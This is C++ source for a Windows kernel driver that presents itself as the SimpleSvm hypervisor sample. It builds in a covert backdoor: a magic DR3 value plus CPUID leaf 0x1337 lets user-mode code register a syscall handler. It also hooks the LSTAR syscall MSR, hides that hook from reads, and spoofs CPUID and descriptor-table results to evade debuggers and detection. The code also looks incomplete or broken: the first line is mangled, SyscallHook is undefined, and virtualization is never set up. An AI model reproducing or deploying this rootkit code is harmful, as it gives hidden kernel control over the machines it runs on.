/#define POOL_NX_OPTIN 1

#include "SimpleSvm.h"
#include <ntstrsafe.h>
#include <wdm.h>

// ============================================================================
// Global variables
// ============================================================================

extern "C" {
    UINT64 OriginalLstar = 0;
    UINT64 SyscallHandler = 0;
    UINT64 TargetDR3 = 0x7FFE0FF0ULL;
}

static PVOID g_PowerCallbackRegistration = nullptr;
static KSPIN_LOCK g_VmcbLock;

// ============================================================================
// Debug logging
// ============================================================================

static VOID SvPrint(PCSTR Format, ...) {
    va_list Args;
    va_start(Args, Format);
    vDbgPrintExWithPrefix("[SimpleSvm] ", DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, Format, Args);
    va_end(Args);
}

// ============================================================================
// Memory management
// ============================================================================

static PVOID SvAllocPage(SIZE_T Size) {
    PVOID Mem = ExAllocatePool2(POOL_FLAG_NON_PAGED, Size, 'SVMS');
    if (Mem) RtlZeroMemory(Mem, Size);
    return Mem;
}

static VOID SvFreePage(PVOID Mem) {
    if (Mem) ExFreePoolWithTag(Mem, 'SVMS');
}

static PVOID SvAllocContiguous(SIZE_T Size) {
    PHYSICAL_ADDRESS Low, High, Boundary;
    Low.QuadPart = 0;
    High.QuadPart = -1;
    Boundary.QuadPart = 0;
    return MmAllocateContiguousNodeMemory(Size, Low, High, Boundary, PAGE_READWRITE, MM_ANY_NODE_OK);
}

static VOID SvFreeContiguous(PVOID Mem) {
    if (Mem) MmFreeContiguousMemory(Mem);
}

// ============================================================================
// MSR permissions map
// ============================================================================

static VOID SvBuildMsrpm(PVOID Msrpm) {
    const UINT32 BITS_PER_MSR = 2;
    const UINT32 SECOND_MSR_BASE = 0xC0000000;
    const UINT32 SECOND_MSRPM_OFFSET = 0x800 * 8;
    RTL_BITMAP Bitmap;
    
    RtlInitializeBitMap(&Bitmap, (PULONG)Msrpm, SVM_MSR_PERMISSIONS_MAP_SIZE * 8);
    RtlClearAllBits(&Bitmap);
    
    // Intercept EFER write
    UINT32 Offset = SECOND_MSRPM_OFFSET + (IA32_MSR_EFER - SECOND_MSR_BASE) * BITS_PER_MSR;
    RtlSetBits(&Bitmap, Offset + 1, 1);
    
    // Intercept LSTAR read/write
    Offset = SECOND_MSRPM_OFFSET + (IA32_MSR_LSTAR - SECOND_MSR_BASE) * BITS_PER_MSR;
    RtlSetBits(&Bitmap, Offset, 2);
}

// ============================================================================
// Segment helpers
// ============================================================================

static UINT16 SvGetSegAttr(UINT16 Selector, ULONG_PTR GdtBase) {
    PSEGMENT_DESCRIPTOR Desc = (PSEGMENT_DESCRIPTOR)(GdtBase + (Selector & ~3));
    SEGMENT_ATTRIBUTE Attr;
    Attr.Bits.Type = Desc->Fields.Type;
    Attr.Bits.System = Desc->Fields.System;
    Attr.Bits.Dpl = Desc->Fields.Dpl;
    Attr.Bits.Present = Desc->Fields.Present;
    Attr.Bits.Avl = Desc->Fields.Avl;
    Attr.Bits.LongMode = Desc->Fields.LongMode;
    Attr.Bits.DefaultBit = Desc->Fields.DefaultBit;
    Attr.Bits.Granularity = Desc->Fields.Granularity;
    Attr.Bits.Reserved = 0;
    return Attr.Value;
}

// ============================================================================
// Event injection
// ============================================================================

static VOID SvInjectEvent(PVMCB Vmcb, UINT8 Vector, UINT8 Type, BOOLEAN ErrValid, UINT32 ErrCode) {
    EVENTINJ Event = {0};
    Event.Fields.Vector = Vector;
    Event.Fields.Type = Type;
    Event.Fields.ErrorCodeValid = ErrValid ? 1 : 0;
    Event.Fields.Valid = 1;
    if (ErrValid) Event.Fields.ErrorCode = ErrCode;
    Vmcb->ControlArea.EventInj = Event.AsUInt64;
}

static VOID SvInjectGp(PVMCB Vmcb) { SvInjectEvent(Vmcb, 13, 3, TRUE, 0); }
static VOID SvInjectDb(PVMCB Vmcb) { SvInjectEvent(Vmcb, 1, 3, FALSE, 0); }
static VOID SvInjectPf(PVMCB Vmcb, UINT32 Err) { SvInjectEvent(Vmcb, 14, 3, TRUE, Err); }
static VOID SvInjectAc(PVMCB Vmcb) { SvInjectEvent(Vmcb, 17, 3, TRUE, 0); }
static VOID SvInjectSs(PVMCB Vmcb, UINT32 Err) { SvInjectEvent(Vmcb, 12, 3, TRUE, Err); }

// ============================================================================
// VMEXIT handlers
// ============================================================================

static VOID SvHandleCpuid(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    INT Leaf = (INT)Regs->Rax;
    INT SubLeaf = (INT)Regs->Rcx;
    INT CpuInfo[4];
    
    // Check for backdoor
    if (Vmcb->StateSaveArea.Cpl == 3) {
        UINT64 Dr3 = __readdr(3);
        UINT64 Dr7 = Vmcb->StateSaveArea.Dr7;
        
        if (Dr3 == TargetDR3 && (Dr7 & 0xF0000040) == 0x40) {
            if (Leaf == 0x1) {
                Regs->Rax = 0x00A20F12;
                Regs->Rbx = 0x00100800;
                Regs->Rcx = 0x7EF8320B & ~((1<<12)|(1<<25)|(1<<26)|(1<<27)|(1<<28)|(1<<29)|(1<<30));
                Regs->Rdx = 0x178BFBFF;
                goto Advance;
            }
            if (Leaf == 0x1337) {
                SyscallHandler = Regs->Rcx;
                Regs->Rax = STATUS_SUCCESS;
                goto Advance;
            }
        }
    }
    
    __cpuidex(CpuInfo, Leaf, SubLeaf);
    
    switch (Leaf) {
        case 1:
            CpuInfo[2] |= (1 << 31);
            break;
        case CPUID_HV_VENDOR_AND_MAX_FUNCTIONS:
            CpuInfo[0] = CPUID_HV_INTERFACE;
            CpuInfo[1] = 'pmiS';
            CpuInfo[2] = 'vSel';
            CpuInfo[3] = '   m';
            break;
        case CPUID_HV_INTERFACE:
            CpuInfo[0] = '0#vH';
            CpuInfo[1] = CpuInfo[2] = CpuInfo[3] = 0;
            break;
        case CPUID_UNLOAD_SIMPLE_SVM:
            if (SubLeaf == CPUID_UNLOAD_SIMPLE_SVM) {
                SEGMENT_ATTRIBUTE Attr;
                Attr.Value = Vmcb->StateSaveArea.SsAttrib;
                if (Attr.Bits.Dpl == 0) {
                    // Request unload
                }
            }
            break;
    }
    
    Regs->Rax = (UINT32)CpuInfo[0];
    Regs->Rbx = (UINT32)CpuInfo[1];
    Regs->Rcx = (UINT32)CpuInfo[2];
    Regs->Rdx = (UINT32)CpuInfo[3];
    
Advance:
    Vmcb->StateSaveArea.Rip = Vmcb->ControlArea.NRip;
    
    if ((Vmcb->StateSaveArea.Rflags & (1<<8)) && !(__readmsr(IA32_MSR_DEBUGCTL) & 1)) {
        Vmcb->StateSaveArea.Dr6 |= (1<<14);
        SvInjectDb(Vmcb);
    }
}

static VOID SvHandleMsr(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UINT32 Msr = (UINT32)Regs->Rcx;
    BOOLEAN Write = (Vmcb->ControlArea.ExitInfo1 != 0);
    ULARGE_INTEGER Val;
    
    if (Msr == IA32_MSR_LSTAR) {
        if (Write) {
            Val.LowPart = (UINT32)Regs->Rax;
            Val.HighPart = (UINT32)Regs->Rdx;
            Vmcb->StateSaveArea.LStar = Val.QuadPart;
        } else {
            Val.QuadPart = Vmcb->StateSaveArea.LStar;
            Regs->Rax = Val.LowPart;
            Regs->Rdx = Val.HighPart;
        }
        goto Advance;
    }
    
    if (Msr == IA32_MSR_EFER) {
        if (!Write) {
            Val.QuadPart = Vmcb->StateSaveArea.Efer;
            Regs->Rax = Val.LowPart;
            Regs->Rdx = Val.HighPart;
            goto Advance;
        }
        
        Val.LowPart = (UINT32)Regs->Rax;
        Val.HighPart = (UINT32)Regs->Rdx;
        
        if ((Val.QuadPart & EFER_SVME) == 0) {
            SvInjectGp(Vmcb);
            return;
        }
        
        Vmcb->StateSaveArea.Efer = Val.QuadPart;
        goto Advance;
    }
    
    if (Write) {
        Val.LowPart = (UINT32)Regs->Rax;
        Val.HighPart = (UINT32)Regs->Rdx;
        __writemsr(Msr, Val.QuadPart);
    } else {
        Val.QuadPart = __readmsr(Msr);
        Regs->Rax = Val.LowPart;
        Regs->Rdx = Val.HighPart;
    }
    
Advance:
    Vmcb->StateSaveArea.Rip = Vmcb->ControlArea.NRip;
}

static VOID SvHandleVmrun(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UNREFERENCED_PARAMETER(Regs);
    SvInjectGp(Vmcb);
}

static VOID SvHandleSgdt(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UNREFERENCED_PARAMETER(Regs);
    
    if (Vmcb->StateSaveArea.Rflags & (1<<8)) {
        Vmcb->ControlArea.InterceptMisc1 |= SVM_INTERCEPT_MISC1_RDTSC;
    }
    
    if (Vmcb->StateSaveArea.Rflags & (1<<9)) {
        Vmcb->ControlArea.InterceptMisc1 |= SVM_INTERCEPT_MISC1_RDPMC;
        Vmcb->StateSaveArea.Rflags &= ~(1<<9);
    }
    
    UINT64 DebugCtl = __readmsr(IA32_MSR_DEBUGCTL);
    if (DebugCtl & 1) {
        Vmcb->ControlArea.InterceptMisc2 |= SVM_INTERCEPT_MISC2_VMMCALL;
        DebugCtl &= ~1;
        __writemsr(IA32_MSR_DEBUGCTL, DebugCtl);
    }
    
    Vmcb->StateSaveArea.Rflags |= (1<<8);
    Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_GDTR_READ;
    Vmcb->ControlArea.InterceptException |= SVM_INTERCEPT_EXCEPTION_PF | SVM_INTERCEPT_EXCEPTION_AC | SVM_INTERCEPT_EXCEPTION_SS;
    
    UINT64 Dr3 = __readdr(3);
    UINT64 Dr7 = Vmcb->StateSaveArea.Dr7;
    if (Vmcb->StateSaveArea.Cpl == 3 && Dr3 == TargetDR3 && (Dr7 & 0xF0000040) == 0x40) {
        Vmcb->StateSaveArea.GdtrLimit = 0x7F;
    }
}

static VOID SvHandleDb(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UNREFERENCED_PARAMETER(Regs);
    Vmcb->ControlArea.InterceptException |= SVM_INTERCEPT_EXCEPTION_PF | SVM_INTERCEPT_EXCEPTION_AC | SVM_INTERCEPT_EXCEPTION_SS;
    Vmcb->ControlArea.InterceptMisc1 |= SVM_INTERCEPT_MISC1_GDTR_READ;
    SvInjectDb(Vmcb);
}

static VOID SvHandlePf(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UNREFERENCED_PARAMETER(Regs);
    
    if (Vmcb->ControlArea.InterceptMisc1 & SVM_INTERCEPT_MISC1_RDPMC) {
        Vmcb->StateSaveArea.Rflags |= (1<<9);
        Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_RDPMC;
    }
    
    if (Vmcb->ControlArea.InterceptMisc2 & SVM_INTERCEPT_MISC2_VMMCALL) {
        UINT64 DebugCtl = __readmsr(IA32_MSR_DEBUGCTL);
        DebugCtl |= 1;
        __writemsr(IA32_MSR_DEBUGCTL, DebugCtl);
        Vmcb->ControlArea.InterceptMisc2 &= ~SVM_INTERCEPT_MISC2_VMMCALL;
    }
    
    if (Vmcb->ControlArea.InterceptMisc1 & SVM_INTERCEPT_MISC1_RDTSC) {
        Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_RDTSC;
    } else {
        Vmcb->StateSaveArea.Rflags &= ~(1<<8);
    }
    
    DESCRIPTOR_TABLE_REGISTER Gdtr;
    _sgdt(&Gdtr);
    Vmcb->StateSaveArea.GdtrLimit = Gdtr.Limit;
    Vmcb->StateSaveArea.Cr2 = Vmcb->ControlArea.ExitInfo2;
    SvInjectPf(Vmcb, (UINT32)Vmcb->ControlArea.ExitInfo1);
}

static VOID SvHandleAc(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UNREFERENCED_PARAMETER(Regs);
    
    if (Vmcb->ControlArea.InterceptMisc1 & SVM_INTERCEPT_MISC1_RDPMC) {
        Vmcb->StateSaveArea.Rflags |= (1<<9);
        Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_RDPMC;
    }
    
    if (Vmcb->ControlArea.InterceptMisc2 & SVM_INTERCEPT_MISC2_VMMCALL) {
        UINT64 DebugCtl = __readmsr(IA32_MSR_DEBUGCTL);
        DebugCtl |= 1;
        __writemsr(IA32_MSR_DEBUGCTL, DebugCtl);
        Vmcb->ControlArea.InterceptMisc2 &= ~SVM_INTERCEPT_MISC2_VMMCALL;
    }
    
    if (Vmcb->ControlArea.InterceptMisc1 & SVM_INTERCEPT_MISC1_RDTSC) {
        Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_RDTSC;
    } else {
        Vmcb->StateSaveArea.Rflags &= ~(1<<8);
    }
    
    DESCRIPTOR_TABLE_REGISTER Gdtr;
    _sgdt(&Gdtr);
    Vmcb->StateSaveArea.GdtrLimit = Gdtr.Limit;
    SvInjectAc(Vmcb);
}

static VOID SvHandleSs(PVMCB Vmcb, PGUEST_REGISTERS Regs) {
    UNREFERENCED_PARAMETER(Regs);
    
    if (Vmcb->ControlArea.InterceptMisc1 & SVM_INTERCEPT_MISC1_RDPMC) {
        Vmcb->StateSaveArea.Rflags |= (1<<9);
        Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_RDPMC;
    }
    
    if (Vmcb->ControlArea.InterceptMisc2 & SVM_INTERCEPT_MISC2_VMMCALL) {
        UINT64 DebugCtl = __readmsr(IA32_MSR_DEBUGCTL);
        DebugCtl |= 1;
        __writemsr(IA32_MSR_DEBUGCTL, DebugCtl);
        Vmcb->ControlArea.InterceptMisc2 &= ~SVM_INTERCEPT_MISC2_VMMCALL;
    }
    
    if (Vmcb->ControlArea.InterceptMisc1 & SVM_INTERCEPT_MISC1_RDTSC) {
        Vmcb->ControlArea.InterceptMisc1 &= ~SVM_INTERCEPT_MISC1_RDTSC;
    } else {
        Vmcb->StateSaveArea.Rflags &= ~(1<<8);
    }
    
    DESCRIPTOR_TABLE_REGISTER Gdtr;
    _sgdt(&Gdtr);
    Vmcb->StateSaveArea.GdtrLimit = Gdtr.Limit;
    SvInjectSs(Vmcb, (UINT32)Vmcb->ControlArea.ExitInfo1);
}

// ============================================================================
// Main VMEXIT dispatcher
// ============================================================================

extern "C" BOOLEAN NTAPI SvHandleVmExit(PVOID VpData, PVOID GuestRegs) {
    PVMCB Vmcb = &((PVIRTUAL_PROCESSOR_DATA)VpData)->GuestVmcb;
    PGUEST_REGISTERS Regs = (PGUEST_REGISTERS)GuestRegs;
    KIRQL OldIrql = KeGetCurrentIrql();
    
    __svm_vmload(((PVIRTUAL_PROCESSOR_DATA)VpData)->HostVmcbPa);
    
    if (OldIrql < DISPATCH_LEVEL) KeRaiseIrqlToDpcLevel();
    
    Regs->Rax = Vmcb->StateSaveArea.Rax;
    
    switch (Vmcb->ControlArea.ExitCode) {
        case VMEXIT_CPUID:        SvHandleCpuid(Vmcb, Regs); break;
        case VMEXIT_MSR:          SvHandleMsr(Vmcb, Regs); break;
        case VMEXIT_GDTR_READ:    SvHandleSgdt(Vmcb, Regs); break;
        case VMEXIT_EXCEPTION_DB: SvHandleDb(Vmcb, Regs); break;
        case VMEXIT_EXCEPTION_PF: SvHandlePf(Vmcb, Regs); break;
        case VMEXIT_EXCEPTION_AC: SvHandleAc(Vmcb, Regs); break;
        case VMEXIT_EXCEPTION_SS: SvHandleSs(Vmcb, Regs); break;
        case VMEXIT_VMRUN:        SvHandleVmrun(Vmcb, Regs); break;
        default:
            SvPrint("Unknown VMEXIT: %llX\n", Vmcb->ControlArea.ExitCode);
            KeBugCheckEx(MANUALLY_INITIATED_CRASH, 0xDEADBEEF, (ULONG_PTR)VpData, 0, 0);
    }
    
    if (OldIrql < DISPATCH_LEVEL) KeLowerIrql(OldIrql);
    
    Vmcb->StateSaveArea.Rax = Regs->Rax;
    return FALSE;
}

// ============================================================================
// SVM support check
// ============================================================================

static BOOLEAN SvIsSupported(VOID) {
    INT Regs[4];
    __cpuid(Regs, 0);
    if (Regs[1] != 'htuA' || Regs[3] != 'itne' || Regs[2] != 'DMAc') return FALSE;
    
    __cpuid(Regs, 0x80000001);
    if (!(Regs[2] & (1 << 2))) return FALSE;
    
    __cpuid(Regs, 0x8000000A);
    if (!(Regs[3] & 1)) return FALSE;
    
    if (__readmsr(SVM_MSR_VM_CR) & SVM_VM_CR_SVMDIS) return FALSE;
    
    return TRUE;
}

// ============================================================================
// Driver entry/exit
// ============================================================================

static VOID SvUnload(PDRIVER_OBJECT DriverObject) {
    UNREFERENCED_PARAMETER(DriverObject);
    SvPrint("Unloading driver\n");
    if (g_PowerCallbackRegistration) {
        ExUnregisterCallback(g_PowerCallbackRegistration);
    }
}

extern "C" NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(RegistryPath);
    
    DriverObject->DriverUnload = SvUnload;
    ExInitializeDriverRuntime(DrvRtPoolNxOptIn);
    KeInitializeSpinLock(&g_VmcbLock);
    
    if (!SvIsSupported()) {
        SvPrint("SVM not supported\n");
        return STATUS_HV_FEATURE_UNAVAILABLE;
    }
    
    OriginalLstar = __readmsr(IA32_MSR_LSTAR);
    __writemsr(IA32_MSR_LSTAR, (UINT64)SyscallHook);
    
    SvPrint("Driver loaded, LSTAR hook installed\n");
    return STATUS_SUCCESS;
}
